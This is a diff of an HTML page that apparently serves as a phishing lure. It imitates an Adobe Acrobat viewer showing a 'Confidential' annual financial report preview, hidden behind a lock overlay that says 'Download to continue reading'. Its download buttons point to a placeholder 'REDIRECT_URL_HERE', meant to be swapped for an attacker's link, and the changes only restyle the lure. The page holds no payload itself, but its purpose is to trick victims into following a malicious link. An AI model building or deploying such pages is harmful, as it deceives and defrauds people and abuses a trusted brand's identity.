@@ -16,162 +16,139 @@
 
         body {
             font-family: 'Adobe Clean', 'Source Sans Pro', -apple-system, BlinkMacSystemFont, 'Segoe UI', Roboto, sans-serif;
-            background: #2d2d2d;
+            background: #393939;
             min-height: 100vh;
             display: flex;
             flex-direction: column;
-            color: #e0e0e0;
+            color: #d4d4d4;
         }
 
-        /* Header */
-        .app-header {
-            background: #1b1b1f;
-            height: 52px;
-            display: flex;
-            align-items: center;
-            justify-content: space-between;
-            padding: 0 24px;
-            border-bottom: 1px solid #3a3a3a;
-        }
-
-        .header-left {
-            display: flex;
-            align-items: center;
-            gap: 16px;
-        }
-
-        .logo-group {
-            display: flex;
-            align-items: center;
-            gap: 10px;
-        }
-
-        .adobe-logo {
-            width: 28px;
-            height: 24px;
-        }
-
-        .logo-text {
-            font-size: 16px;
-            font-weight: 600;
-            color: #ffffff;
-        }
-
-        .header-divider {
-            width: 1px;
-            height: 24px;
-            background: #444;
-        }
-
-        .nav-tabs {
-            display: flex;
-            gap: 4px;
-        }
-
-        .nav-tab {
-            color: #a0a0a0;
-            font-size: 13px;
-            font-weight: 500;
-            padding: 8px 16px;
-            border-radius: 6px;
-            cursor: pointer;
-            text-decoration: none;
-            transition: all 0.15s;
-        }
-
-        .nav-tab:hover {
-            color: #ffffff;
-            background: rgba(255,255,255,0.06);
-        }
-
-        .nav-tab.active {
-            color: #ffffff;
-            background: rgba(255,255,255,0.1);
-        }
-
-        .header-right {
-            display: flex;
-            align-items: center;
-            gap: 8px;
-        }
-
-        .header-icon {
-            width: 36px;
-            height: 36px;
-            display: flex;
-            align-items: center;
-            justify-content: center;
-            border-radius: 6px;
-            background: none;
-            border: none;
-            color: #a0a0a0;
-            cursor: pointer;
-            transition: all 0.15s;
-        }
-
-        .header-icon:hover {
-            color: #ffffff;
-            background: rgba(255,255,255,0.08);
-        }
-
-        .header-icon svg {
-            width: 20px;
-            height: 20px;
-        }
-
-        .user-avatar {
-            width: 32px;
-            height: 32px;
-            border-radius: 50%;
-            background: linear-gradient(135deg, #5b7fde, #3a5fc8);
-            color: #ffffff;
-            font-size: 12px;
-            font-weight: 600;
-            display: flex;
-            align-items: center;
-            justify-content: center;
-            cursor: pointer;
-            margin-left: 8px;
-        }
-
-        /* Toolbar */
-        .toolbar {
-            background: #252528;
+        /* App bar */
+        .app-bar {
+            background: #1c1c20;
             height: 48px;
             display: flex;
             align-items: center;
             justify-content: space-between;
             padding: 0 20px;
-            border-bottom: 1px solid #3a3a3a;
         }
 
-        .toolbar-left {
+        .app-bar-left {
             display: flex;
             align-items: center;
             gap: 12px;
         }
 
-        .filename {
-            color: #c8c8c8;
+        .app-bar-left svg {
+            width: 22px;
+            height: 18px;
+        }
+
+        .app-bar-left span {
             font-size: 14px;
+            font-weight: 600;
+            color: #fff;
+        }
+
+        .bar-sep {
+            width: 1px;
+            height: 18px;
+            background: #444;
+        }
+
+        .bar-nav {
+            display: flex;
+            gap: 2px;
+        }
+
+        .bar-nav a {
+            font-size: 12px;
+            color: #aaa;
+            text-decoration: none;
+            padding: 5px 12px;
+            border-radius: 5px;
             font-weight: 500;
         }
 
-        .toolbar-center {
-            display: flex;
-            align-items: center;
-            gap: 8px;
+        .bar-nav a:hover {
+            color: #fff;
+            background: rgba(255,255,255,0.06);
         }
 
-        .page-nav {
+        .bar-nav a.active {
+            color: #fff;
+            background: rgba(255,255,255,0.1);
+        }
+
+        .app-bar-right {
             display: flex;
             align-items: center;
             gap: 6px;
         }
 
-        .page-btn {
-            width: 28px;
-            height: 28px;
+        .bar-icon {
+            width: 30px;
+            height: 30px;
+            display: flex;
+            align-items: center;
+            justify-content: center;
+            border-radius: 5px;
+            background: none;
+            border: none;
+            color: #999;
+            cursor: pointer;
+        }
+
+        .bar-icon:hover {
+            color: #fff;
+            background: rgba(255,255,255,0.06);
+        }
+
+        .bar-icon svg {
+            width: 16px;
+            height: 16px;
+        }
+
+        .bar-avatar {
+            width: 26px;
+            height: 26px;
+            border-radius: 50%;
+            background: #4b6cb7;
+            color: #fff;
+            font-size: 10px;
+            font-weight: 600;
+            display: flex;
+            align-items: center;
+            justify-content: center;
+            margin-left: 6px;
+        }
+
+        /* Toolbar */
+        .toolbar {
+            background: #28282c;
+            height: 42px;
+            display: flex;
+            align-items: center;
+            justify-content: space-between;
+            padding: 0 16px;
+            border-bottom: 1px solid #3a3a3a;
+        }
+
+        .tb-filename {
+            font-size: 13px;
+            color: #c0c0c0;
+            font-weight: 500;
+        }
+
+        .tb-center {
+            display: flex;
+            align-items: center;
+            gap: 6px;
+        }
+
+        .pg-btn {
+            width: 26px;
+            height: 26px;
             display: flex;
             align-items: center;
             justify-content: center;
@@ -182,429 +159,409 @@
             cursor: pointer;
         }
 
-        .page-btn:hover {
+        .pg-btn:hover {
             color: #fff;
-            background: rgba(255,255,255,0.08);
+            background: rgba(255,255,255,0.06);
         }
 
-        .page-btn svg {
-            width: 16px;
-            height: 16px;
+        .pg-btn svg {
+            width: 14px;
+            height: 14px;
         }
 
-        .page-input {
-            width: 40px;
-            height: 28px;
+        .pg-input {
+            width: 36px;
+            height: 24px;
             background: #1a1a1d;
             border: 1px solid #444;
-            border-radius: 4px;
-            color: #e0e0e0;
+            border-radius: 3px;
+            color: #ddd;
             text-align: center;
-            font-size: 12px;
+            font-size: 11px;
         }
 
-        .page-total {
+        .pg-total {
+            font-size: 11px;
             color: #888;
-            font-size: 12px;
         }
 
-        .zoom-controls {
+        .zoom-area {
             display: flex;
             align-items: center;
             gap: 4px;
-            margin-left: 16px;
-            padding-left: 16px;
+            margin-left: 12px;
+            padding-left: 12px;
             border-left: 1px solid #3a3a3a;
         }
 
-        .zoom-level {
+        .zoom-val {
+            font-size: 11px;
             color: #888;
-            font-size: 12px;
-            min-width: 42px;
+            min-width: 36px;
             text-align: center;
         }
 
-        .toolbar-right {
+        .tb-right {
             display: flex;
             align-items: center;
-            gap: 6px;
+            gap: 4px;
         }
 
-        .tool-btn {
+        .tb-btn {
             display: flex;
             align-items: center;
-            gap: 6px;
+            gap: 5px;
             background: none;
             border: none;
-            color: #a0a0a0;
-            font-size: 12px;
+            color: #999;
+            font-size: 11px;
             font-weight: 500;
-            padding: 6px 12px;
-            border-radius: 6px;
+            padding: 5px 10px;
+            border-radius: 5px;
             cursor: pointer;
-            transition: all 0.15s;
         }
 
-        .tool-btn:hover {
+        .tb-btn:hover {
             color: #fff;
-            background: rgba(255,255,255,0.08);
+            background: rgba(255,255,255,0.06);
         }
 
-        .tool-btn svg {
-            width: 16px;
-            height: 16px;
+        .tb-btn svg {
+            width: 14px;
+            height: 14px;
         }
 
-        .tool-btn.primary {
+        .tb-btn.accent {
             background: #1473e6;
             color: #fff;
         }
 
-        .tool-btn.primary:hover {
+        .tb-btn.accent:hover {
             background: #0d66d0;
         }
 
-        /* Main viewer area */
-        .viewer-main {
+        /* Viewer */
+        .viewer {
             flex: 1;
             display: flex;
             overflow: hidden;
         }
 
-        /* Sidebar */
-        .sidebar {
-            width: 180px;
-            background: #252528;
+        /* Thumbnails */
+        .thumbs {
+            width: 160px;
+            background: #28282c;
             border-right: 1px solid #3a3a3a;
             overflow-y: auto;
-            padding: 16px;
+            padding: 12px;
             display: flex;
             flex-direction: column;
-            gap: 12px;
+            gap: 10px;
         }
 
-        .thumb-page {
-            background: #ffffff;
-            border-radius: 4px;
-            padding: 10px 8px;
+        .thumb {
+            background: #fff;
+            border-radius: 3px;
+            padding: 8px 6px;
             cursor: pointer;
             border: 2px solid transparent;
-            transition: all 0.15s;
         }
 
-        .thumb-page:hover {
+        .thumb:hover {
             border-color: #555;
         }
 
-        .thumb-page.active {
+        .thumb.active {
             border-color: #1473e6;
         }
 
-        .thumb-line {
-            height: 4px;
+        .tl {
+            height: 3px;
             background: #ddd;
             border-radius: 2px;
-            margin-bottom: 5px;
+            margin-bottom: 4px;
         }
 
-        .thumb-line.head {
-            width: 45%;
-            height: 6px;
+        .tl.head {
+            width: 40%;
+            height: 5px;
             background: #bbb;
-            margin-bottom: 8px;
+            margin-bottom: 6px;
         }
 
-        .thumb-line.w90 { width: 90%; }
-        .thumb-line.w85 { width: 85%; }
-        .thumb-line.w78 { width: 78%; }
-        .thumb-line.w95 { width: 95%; }
-        .thumb-line.w70 { width: 70%; }
+        .tl.w90 { width: 90%; }
+        .tl.w85 { width: 85%; }
+        .tl.w80 { width: 80%; }
+        .tl.w95 { width: 95%; }
+        .tl.w70 { width: 70%; }
 
         .thumb-num {
-            font-size: 9px;
-            color: #888;
             text-align: center;
-            margin-top: 6px;
+            font-size: 8px;
+            color: #888;
+            margin-top: 4px;
         }
 
-        /* Document canvas */
-        .doc-canvas {
+        /* Canvas */
+        .canvas {
             flex: 1;
             overflow: auto;
             display: flex;
             justify-content: center;
-            padding: 32px 24px;
-            background: #404040;
+            padding: 28px 20px;
+            background: #444;
         }
 
-        .doc-page {
-            background: #ffffff;
-            width: 680px;
-            min-height: 880px;
-            box-shadow: 0 4px 24px rgba(0,0,0,0.4);
+        .page {
+            background: #fff;
+            width: 640px;
+            min-height: 840px;
+            box-shadow: 0 4px 20px rgba(0,0,0,0.35);
             border-radius: 2px;
             position: relative;
             flex-shrink: 0;
         }
 
-        .page-content {
-            padding: 56px 52px;
-            color: #1a1a1a;
+        .page-inner {
+            padding: 48px 44px;
+            color: #222;
         }
 
-        .doc-title {
-            font-size: 24px;
+        .page-inner h1 {
+            font-size: 22px;
             font-weight: 700;
             color: #111;
-            margin-bottom: 8px;
+            margin-bottom: 6px;
         }
 
-        .doc-subtitle {
-            font-size: 14px;
-            color: #666;
-            margin-bottom: 28px;
-            padding-bottom: 18px;
-            border-bottom: 1px solid #e8e8e8;
+        .page-inner .subtitle {
+            font-size: 13px;
+            color: #777;
+            margin-bottom: 24px;
+            padding-bottom: 14px;
+            border-bottom: 1px solid #eee;
         }
 
-        .section-heading {
-            font-size: 16px;
+        .page-inner h2 {
+            font-size: 15px;
             font-weight: 700;
             color: #222;
-            margin-top: 28px;
+            margin-top: 24px;
+            margin-bottom: 10px;
+        }
+
+        .page-inner p {
+            font-size: 12px;
+            line-height: 1.75;
+            color: #444;
             margin-bottom: 12px;
         }
 
-        .doc-para {
-            font-size: 13px;
-            line-height: 1.8;
-            color: #333;
-            margin-bottom: 14px;
-        }
-
-        /* Content lock overlay */
-        .lock-overlay {
+        /* Lock gradient */
+        .lock-grad {
             position: absolute;
             left: 0;
             right: 0;
             bottom: 0;
-            height: 60%;
-            background: linear-gradient(to bottom, rgba(255,255,255,0) 0%, rgba(255,255,255,0.9) 35%, rgba(255,255,255,0.98) 100%);
+            height: 55%;
+            background: linear-gradient(to bottom, rgba(255,255,255,0) 0%, rgba(255,255,255,0.92) 40%, rgba(255,255,255,0.99) 100%);
             display: flex;
             flex-direction: column;
             align-items: center;
             justify-content: flex-end;
-            padding-bottom: 80px;
+            padding-bottom: 70px;
         }
 
-        .lock-icon {
-            width: 56px;
-            height: 56px;
+        .lock-circle {
+            width: 48px;
+            height: 48px;
             background: #1473e6;
             border-radius: 50%;
             display: flex;
             align-items: center;
             justify-content: center;
-            margin-bottom: 18px;
+            margin-bottom: 14px;
         }
 
-        .lock-icon svg {
-            width: 26px;
-            height: 26px;
+        .lock-circle svg {
+            width: 22px;
+            height: 22px;
             fill: #fff;
         }
 
-        .lock-title {
-            font-size: 18px;
+        .lock-grad h3 {
+            font-size: 16px;
             font-weight: 600;
-            color: #1a1a1a;
-            margin-bottom: 8px;
+            color: #222;
+            margin-bottom: 6px;
         }
 
-        .lock-text {
-            font-size: 14px;
-            color: #666;
-            margin-bottom: 20px;
+        .lock-grad p {
+            font-size: 13px;
+            color: #777;
+            margin-bottom: 16px;
             text-align: center;
-            max-width: 320px;
+            max-width: 280px;
         }
 
-        .download-btn {
+        .dl-btn {
             display: inline-flex;
             align-items: center;
-            gap: 10px;
+            gap: 8px;
             background: #1473e6;
             color: #fff;
             border: none;
-            border-radius: 24px;
-            padding: 14px 32px;
-            font-size: 15px;
+            border-radius: 20px;
+            padding: 12px 28px;
+            font-size: 14px;
             font-weight: 600;
             cursor: pointer;
-            transition: all 0.2s;
+            transition: background 0.2s;
         }
 
-        .download-btn:hover {
+        .dl-btn:hover {
             background: #0d66d0;
-            box-shadow: 0 6px 20px rgba(20, 115, 230, 0.3);
         }
 
-        .download-btn svg {
-            width: 18px;
-            height: 18px;
+        .dl-btn svg {
+            width: 16px;
+            height: 16px;
         }
 
-        /* Footer */
-        .footer-bar {
-            background: #1b1b1f;
-            padding: 8px 24px;
+        /* Status bar */
+        .status-bar {
+            background: #1c1c20;
+            padding: 6px 20px;
             display: flex;
             align-items: center;
             justify-content: space-between;
-            font-size: 11px;
+            font-size: 10px;
             color: #666;
         }
 
-        /* Print styles */
         @media print {
             body { background: #fff; }
-            .app-header, .toolbar, .sidebar, .footer-bar, .lock-overlay { display: none; }
-            .viewer-main { display: block; }
-            .doc-canvas { padding: 0; background: #fff; }
-            .doc-page { box-shadow: none; width: 100%; }
+            .app-bar, .toolbar, .thumbs, .status-bar, .lock-grad { display: none; }
+            .viewer { display: block; }
+            .canvas { padding: 0; background: #fff; }
+            .page { box-shadow: none; width: 100%; }
         }
     </style>
 </head>
 <body>
-    <!-- Header -->
-    <header class="app-header">
-        <div class="header-left">
-            <div class="logo-group">
-                <svg class="adobe-logo" viewBox="0 0 30 26" fill="none">
-                    <path d="M11.5 0H0V26L11.5 0Z" fill="#EB1000"/>
-                    <path d="M18.5 0H30V26L18.5 0Z" fill="#EB1000"/>
-                    <path d="M15 9.6L22.1 26H17.5L15.3 20.5H10L15 9.6Z" fill="#EB1000"/>
-                </svg>
-                <span class="logo-text">Acrobat</span>
-            </div>
-            <div class="header-divider"></div>
-            <nav class="nav-tabs">
-                <a class="nav-tab" href="#">Home</a>
-                <a class="nav-tab active" href="#">Documents</a>
-                <a class="nav-tab" href="#">All tools</a>
+    <header class="app-bar">
+        <div class="app-bar-left">
+            <svg viewBox="0 0 30 26" fill="none">
+                <path d="M11.5 0H0V26L11.5 0Z" fill="#EB1000"/>
+                <path d="M18.5 0H30V26L18.5 0Z" fill="#EB1000"/>
+                <path d="M15 9.6L22.1 26H17.5L15.3 20.5H10L15 9.6Z" fill="#EB1000"/>
+            </svg>
+            <span>Acrobat</span>
+            <div class="bar-sep"></div>
+            <nav class="bar-nav">
+                <a href="#">Home</a>
+                <a href="#" class="active">Documents</a>
+                <a href="#">Tools</a>
             </nav>
         </div>
-        <div class="header-right">
-            <button class="header-icon" title="Notifications">
+        <div class="app-bar-right">
+            <button class="bar-icon" title="Notifications">
                 <svg viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2"><path d="M18 8A6 6 0 006 8c0 7-3 9-3 9h18s-3-2-3-9"/><path d="M13.73 21a2 2 0 01-3.46 0"/></svg>
             </button>
-            <button class="header-icon" title="Help">
+            <button class="bar-icon" title="Help">
                 <svg viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2"><circle cx="12" cy="12" r="10"/><path d="M9.09 9a3 3 0 015.83 1c0 2-3 3-3 3"/><line x1="12" y1="17" x2="12.01" y2="17"/></svg>
             </button>
-            <div class="user-avatar">JD</div>
+            <div class="bar-avatar">JD</div>
         </div>
     </header>
 
-    <!-- Toolbar -->
     <div class="toolbar">
-        <div class="toolbar-left">
-            <span class="filename">Annual_Report_2026.pdf</span>
-        </div>
-        <div class="toolbar-center">
-            <div class="page-nav">
-                <button class="page-btn"><svg viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2"><polyline points="15 18 9 12 15 6"/></svg></button>
-                <input type="text" class="page-input" value="1" readonly>
-                <span class="page-total">/ 24</span>
-                <button class="page-btn"><svg viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2"><polyline points="9 18 15 12 9 6"/></svg></button>
-            </div>
-            <div class="zoom-controls">
-                <button class="page-btn"><svg viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2"><line x1="5" y1="12" x2="19" y2="12"/></svg></button>
-                <span class="zoom-level">100%</span>
-                <button class="page-btn"><svg viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2"><line x1="12" y1="5" x2="12" y2="19"/><line x1="5" y1="12" x2="19" y2="12"/></svg></button>
+        <span class="tb-filename">Annual_Report_2026.pdf</span>
+        <div class="tb-center">
+            <button class="pg-btn"><svg viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2"><polyline points="15 18 9 12 15 6"/></svg></button>
+            <input type="text" class="pg-input" value="1" readonly>
+            <span class="pg-total">/ 24</span>
+            <button class="pg-btn"><svg viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2"><polyline points="9 18 15 12 9 6"/></svg></button>
+            <div class="zoom-area">
+                <button class="pg-btn"><svg viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2"><line x1="5" y1="12" x2="19" y2="12"/></svg></button>
+                <span class="zoom-val">100%</span>
+                <button class="pg-btn"><svg viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2"><line x1="12" y1="5" x2="12" y2="19"/><line x1="5" y1="12" x2="19" y2="12"/></svg></button>
             </div>
         </div>
-        <div class="toolbar-right">
-            <button class="tool-btn">
-                <svg viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2"><path d="M17 3a2.85 2.85 0 114 4L7.5 20.5 2 22l1.5-5.5L17 3z"/></svg>
-                Comment
-            </button>
-            <button class="tool-btn">
+        <div class="tb-right">
+            <button class="tb-btn">
                 <svg viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2"><circle cx="18" cy="5" r="3"/><circle cx="6" cy="12" r="3"/><circle cx="18" cy="19" r="3"/><line x1="8.59" y1="13.51" x2="15.42" y2="17.49"/><line x1="15.41" y1="6.51" x2="8.59" y2="10.49"/></svg>
                 Share
             </button>
-            <button class="tool-btn primary" onclick="window.location.href='REDIRECT_URL_HERE'">
+            <button class="tb-btn accent" onclick="window.location.href='REDIRECT_URL_HERE'">
                 <svg viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2"><path d="M21 15v4a2 2 0 01-2 2H5a2 2 0 01-2-2v-4"/><polyline points="7 10 12 15 17 10"/><line x1="12" y1="15" x2="12" y2="3"/></svg>
                 Download
             </button>
         </div>
     </div>
 
-    <!-- Main viewer -->
-    <main class="viewer-main">
-        <!-- Sidebar thumbnails -->
-        <aside class="sidebar">
-            <div class="thumb-page active">
-                <div class="thumb-line head"></div>
-                <div class="thumb-line w95"></div>
-                <div class="thumb-line w90"></div>
-                <div class="thumb-line w85"></div>
-                <div class="thumb-line w95"></div>
-                <div class="thumb-line w78"></div>
+    <main class="viewer">
+        <aside class="thumbs">
+            <div class="thumb active">
+                <div class="tl head"></div>
+                <div class="tl w95"></div>
+                <div class="tl w90"></div>
+                <div class="tl w85"></div>
+                <div class="tl w95"></div>
+                <div class="tl w80"></div>
                 <div class="thumb-num">1</div>
             </div>
-            <div class="thumb-page">
-                <div class="thumb-line head" style="width:35%"></div>
-                <div class="thumb-line w90"></div>
-                <div class="thumb-line w95"></div>
-                <div class="thumb-line w85"></div>
-                <div class="thumb-line w90"></div>
-                <div class="thumb-line w70"></div>
+            <div class="thumb">
+                <div class="tl head" style="width:30%"></div>
+                <div class="tl w90"></div>
+                <div class="tl w95"></div>
+                <div class="tl w85"></div>
+                <div class="tl w90"></div>
+                <div class="tl w70"></div>
                 <div class="thumb-num">2</div>
             </div>
-            <div class="thumb-page">
-                <div class="thumb-line w95"></div>
-                <div class="thumb-line w85"></div>
-                <div class="thumb-line w90"></div>
-                <div class="thumb-line w95"></div>
-                <div class="thumb-line w78"></div>
-                <div class="thumb-line w85"></div>
+            <div class="thumb">
+                <div class="tl w95"></div>
+                <div class="tl w85"></div>
+                <div class="tl w90"></div>
+                <div class="tl w95"></div>
+                <div class="tl w80"></div>
+                <div class="tl w85"></div>
                 <div class="thumb-num">3</div>
             </div>
-            <div class="thumb-page">
-                <div class="thumb-line head"></div>
-                <div class="thumb-line w90"></div>
-                <div class="thumb-line w85"></div>
-                <div class="thumb-line w95"></div>
-                <div class="thumb-line w70"></div>
-                <div class="thumb-line w85"></div>
+            <div class="thumb">
+                <div class="tl head"></div>
+                <div class="tl w90"></div>
+                <div class="tl w85"></div>
+                <div class="tl w95"></div>
+                <div class="tl w70"></div>
+                <div class="tl w85"></div>
                 <div class="thumb-num">4</div>
             </div>
         </aside>
 
-        <!-- Document -->
-        <section class="doc-canvas">
-            <article class="doc-page">
-                <div class="page-content">
-                    <h1 class="doc-title">Annual Financial Report</h1>
-                    <p class="doc-subtitle">Fiscal Year 2026 &mdash; Confidential Document</p>
+        <section class="canvas">
+            <article class="page">
+                <div class="page-inner">
+                    <h1>Annual Financial Report</h1>
+                    <p class="subtitle">Fiscal Year 2026 &mdash; Confidential</p>
 
-                    <h2 class="section-heading">1. Executive Summary</h2>
-                    <p class="doc-para">This comprehensive report provides stakeholders with a detailed analysis of our company's financial performance throughout fiscal year 2026. Our strategic initiatives have yielded significant growth across all major business segments.</p>
-                    <p class="doc-para">Revenue increased by 18.7% year-over-year, driven primarily by expansion in emerging markets and successful product launches. Operating margins improved to 24.3%, reflecting our continued focus on operational efficiency.</p>
+                    <h2>1. Executive Summary</h2>
+                    <p>This report provides stakeholders with a detailed analysis of our financial performance throughout fiscal year 2026. Strategic initiatives have yielded significant growth across all major business segments.</p>
+                    <p>Revenue increased by 18.7% year-over-year, driven by expansion in emerging markets and successful product launches. Operating margins improved to 24.3%, reflecting continued focus on operational efficiency.</p>
 
-                    <h2 class="section-heading">2. Revenue Analysis</h2>
-                    <p class="doc-para">Total consolidated revenue reached $4.82 billion for the fiscal year, exceeding analyst expectations by 6.2%. The breakdown by business segment demonstrates strong performance across the portfolio:</p>
-                    <p class="doc-para">• Enterprise Solutions: $2.14B (+22.1% YoY)<br>• Cloud Services: $1.68B (+31.4% YoY)<br>• Professional Services: $0.72B (+8.3% YoY)<br>• Licensing: $0.28B (+4.6% YoY)</p>
+                    <h2>2. Revenue Analysis</h2>
+                    <p>Total consolidated revenue reached $4.82 billion for the fiscal year, exceeding analyst expectations by 6.2%. Breakdown by segment:</p>
+                    <p>&bull; Enterprise Solutions: $2.14B (+22.1% YoY)<br>&bull; Cloud Services: $1.68B (+31.4% YoY)<br>&bull; Professional Services: $0.72B (+8.3% YoY)<br>&bull; Licensing: $0.28B (+4.6% YoY)</p>
                 </div>
 
-                <!-- Lock overlay -->
-                <div class="lock-overlay">
-                    <div class="lock-icon">
+                <div class="lock-grad">
+                    <div class="lock-circle">
                         <svg viewBox="0 0 24 24"><path d="M18 8h-1V6c0-2.76-2.24-5-5-5S7 3.24 7 6v2H6c-1.1 0-2 .9-2 2v10c0 1.1.9 2 2 2h12c1.1 0 2-.9 2-2V10c0-1.1-.9-2-2-2zM12 17c-1.1 0-2-.9-2-2s.9-2 2-2 2 .9 2 2-.9 2-2 2zm3.1-9H8.9V6c0-1.71 1.39-3.1 3.1-3.1s3.1 1.39 3.1 3.1v2z"/></svg>
                     </div>
-                    <h3 class="lock-title">Download to continue reading</h3>
-                    <p class="lock-text">This document is protected. Download the full PDF to access all 24 pages.</p>
-                    <button class="download-btn" onclick="window.location.href='REDIRECT_URL_HERE'">
+                    <h3>Download to continue reading</h3>
+                    <p>This document is protected. Download the full PDF to access all 24 pages.</p>
+                    <button class="dl-btn" onclick="window.location.href='REDIRECT_URL_HERE'">
                         <svg viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2"><path d="M21 15v4a2 2 0 01-2 2H5a2 2 0 01-2-2v-4"/><polyline points="7 10 12 15 17 10"/><line x1="12" y1="15" x2="12" y2="3"/></svg>
                         Download PDF
                     </button>
@@ -613,8 +570,7 @@
         </section>
     </main>
 
-    <!-- Footer -->
-    <footer class="footer-bar">
+    <footer class="status-bar">
         <span>Annual_Report_2026.pdf &mdash; 5.8 MB</span>
         <span>Last modified: Apr 14, 2026</span>
     </footer>
